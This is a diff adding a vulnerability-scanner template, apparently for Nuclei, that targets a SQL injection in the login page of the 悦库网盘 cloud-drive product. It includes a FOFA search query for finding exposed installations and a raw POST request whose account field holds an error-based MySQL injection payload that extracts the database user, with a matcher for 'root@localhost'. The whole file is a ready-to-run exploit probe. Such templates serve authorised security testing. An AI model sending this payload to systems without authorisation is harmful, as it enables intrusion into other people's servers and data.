@@ -1,0 +1,32 @@
+id: YKQYWP-user-login-sql
+
+info:
+  name: YKQYWP-user-login-sql
+  author: lengmo
+  severity: high
+  description: YKQYWP-user-login-sql
+  tags: sqli
+  metadata:
+    fofa-qeury: app="悦库-悦库网盘"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /user/login/.html HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded
+
+        account=') AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(5597=5597,user()))),0x7e),5597)-- HZLK
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '~root@localhost~'
+      - type: status
+        status: 
+          - 200
